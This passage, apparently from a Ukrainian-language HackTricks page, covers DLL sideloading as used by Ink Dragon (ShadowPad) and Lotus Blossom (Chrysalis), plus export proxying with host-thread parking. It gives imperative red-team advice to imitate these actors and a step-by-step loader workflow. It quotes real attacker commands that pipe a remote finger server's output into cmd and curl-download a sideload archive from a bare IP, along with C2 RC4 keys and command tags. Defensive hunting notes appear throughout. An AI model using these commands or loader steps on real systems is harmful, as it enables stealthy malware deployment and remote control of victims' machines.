Check Point описала, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad**, щоб маскуватися під legitimate software і водночас зберігати core payload зашифрованим на диску:

1. **Signed host EXE** – використовуються vendors на кшталт AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable так, щоб він виглядав як Windows binary (наприклад, `conhost.exe`), але Authenticode signature лишається валідною.
2. **Malicious loader DLL** – скидається поруч із EXE під очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, обфускований за допомогою framework ScatterBrain; його єдине завдання — знайти encrypted blob, розшифрувати його і reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тій самій директорії. Після memory-mapping decrypted payload loader видаляє TMP file, щоб знищити forensic evidence.

Tradecraft notes:

* Перейменування signed EXE (при збереженні оригінального `OriginalFileName` у PE header) дозволяє йому маскуватися під Windows binary, але зберігати vendor signature, тож відтворюйте звичку Ink Dragon скидати binaries, схожі на `conhost.exe`, які насправді є AMD/NVIDIA utilities.
* Оскільки executable залишається trusted, більшість allowlisting controls повинні лише дозволяти ваш malicious DLL поруч із ним. Зосередьтеся на кастомізації loader DLL; signed parent зазвичай може працювати без змін.
* ShadowPad decryptor очікує, що TMP blob буде поруч із loader і буде writable, щоб можна було занулити file після mapping. Залишайте directory writable, доки payload не завантажиться; після завантаження в memory TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading із LOLBAS, щоб єдиним custom artifact на диску був malicious DLL поруч із trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує команди з Finger server і передає їх у `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує TCP/79 text; `| cmd` виконує server response, дозволяючи operators змінювати second stage server-side.

- **Built-in download/extract:** Завантажте archive з benign extension, розпакуйте його і підготуйте sideload target плюс DLL у випадковій `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` приховує progress і слідує redirects; `tar -xf` використовує вбудований Windows tar.

- **WMI/CIM launch:** Запустіть EXE через WMI, щоб telemetry показувала CIM-created process, поки він завантажує colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Працює з binaries, які віддають перевагу local DLLs (наприклад, `intelbq.exe`, `nearby_share.exe`); payload (наприклад, Remcos) запускається під trusted name.

- **Hunting:** Сповіщайте на `forfiles`, коли `/p`, `/m` і `/c` з’являються разом; це незвично поза admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Недавнє intrusion Lotus Blossom використало trusted update chain, щоб доставити NSIS-packed dropper, який підготував DLL sideload плюс повністю in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає її як **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` і encrypted blob `BluetoothService`, а потім запускає EXE.
- Host EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` decrypts його за допомогою custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from a prior hash), перезаписує buffer plaintext shellcode, звільняє temp-об’єкти і стрибає в нього.
- Щоб уникнути IAT, loader вирішує APIs шляхом hashing export names із використанням **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, а потім застосовує Murmur-style avalanche (**0x85EBCA6B**) і порівнює це з salted target hashes.

Main shellcode (Chrysalis)
- Decrypts PE-like main module, повторюючи add/XOR/sub з key `gQ2JR&9;` протягом п’яти passes, потім dynamically loads `Kernel32.dll` → `GetProcAddress`, щоб завершити import resolution.
- Reconstructs DLL name strings at runtime via per-character bit-rotate/XOR transforms, потім завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує second resolver, який обходить **PEB → InMemoryOrderModuleList**, аналізує кожну export table у 4-byte blocks із Murmur-style mixing і лише повертається до `GetProcAddress`, якщо hash не знайдено.

Embedded configuration & C2
- Config лежить усередині скинутого `BluetoothService` file на **offset 0x30808** (size **0x980**) і decrypts RC4 з key `qwhvb^435h&*7`, відкриваючи C2 URL і User-Agent.
- Beacons будують dot-delimited host profile, додають tag `4Q`, потім RC4-encrypt з key `vAuig34%^325hGV` перед `HttpSendRequestA` over HTTPS. Responses RC4-decrypt і dispatch через tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode залежить від CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i` relaunches self with `-k`; `-k` skips install and runs payload.

Alternate loader observed
- Та сама intrusion скинула Tiny C Compiler і запустила `svchost.exe -nostdlib -run conf.c` із `C:\ProgramData\USOShared\`, поруч із `libtcc.dll`. C source, наданий attacker, вбудовував shellcode, компілював його і запускав in-memory без запису PE на disk. Відтворіть з:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей етап compile-and-run на основі TCC імпортував `Wininet.dll` під час виконання і підтягав second-stage shellcode з hardcoded URL, створюючи гнучкий loader, який маскувався під запуск compiler.

## Signed-host sideloading with export proxying + host thread parking

Деякі DLL sideloading chains додають **stability engineering**, щоб легітимний host залишався активним достатньо довго для коректного завантаження пізніших stage замість аварійного завершення після завантаження malicious DLL.

Observed pattern
- Підкинути trusted EXE поруч із malicious DLL, використовуючи очікувану назву dependency, наприклад `version.dll`.
- Malicious DLL **проксіює кожен очікуваний export** до реальної system DLL (наприклад `%SystemRoot%\\System32\\version.dll`), щоб import resolution усе ще успішно проходив, а host process продовжував працювати.
- Після завантаження malicious DLL **патчить host entry point**, щоб main thread потрапив у нескінченний `Sleep` loop замість завершення або виконання code paths, які б завершили process.
- Новий thread виконує реальну malicious роботу: decrypting назви або path наступного stage DLL (RC4/XOR є поширеними), після чого запускає її через `LoadLibrary`.

Why this matters
- Звичайний DLL proxying зберігає API compatibility, але не гарантує, що host залишиться активним достатньо довго для пізніших stage.
- Parking main thread у `Sleep(INFINITE)` — це простий спосіб утримати signed process у пам’яті, поки loader виконує decryption, staging або network bootstrap у worker thread.
- Hunting лише за підозрілим `DllMain` пропустить цей pattern, якщо цікава поведінка відбувається після того, як host entry point пропатчено і стартує secondary thread.

Minimal workflow
1. Скопіювати signed host EXE і визначити DLL, яку він резолвить із local directory.
2. Зібрати proxy DLL, яка експортує ті самі functions і forward'ить їх до legitimate DLL.
3. У `DllMain(DLL_PROCESS_ATTACH)` створити worker thread.
4. Із цього thread пропатчити host entry point або main thread start routine так, щоб він циклічно викликав `Sleep`.
5. Decrypt next-stage DLL name/config і викликати `LoadLibrary` або manual-map payload.

Defensive pivots
- Signed processes, які завантажують `version.dll` або подібні common libraries зі своєї application directory замість `System32`.
- Memory patches на process entry point невдовзі після image load, особливо jumps/calls, перенаправлені на `Sleep`/`SleepEx`.
- Threads, створені proxy DLL, які одразу викликають `LoadLibrary` для second DLL із decrypted name.
- Full-export proxy DLL, розміщені поруч із vendor executables у writable staging directories, таких як `ProgramData`, `%TEMP%` або paths розпакованих archive.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
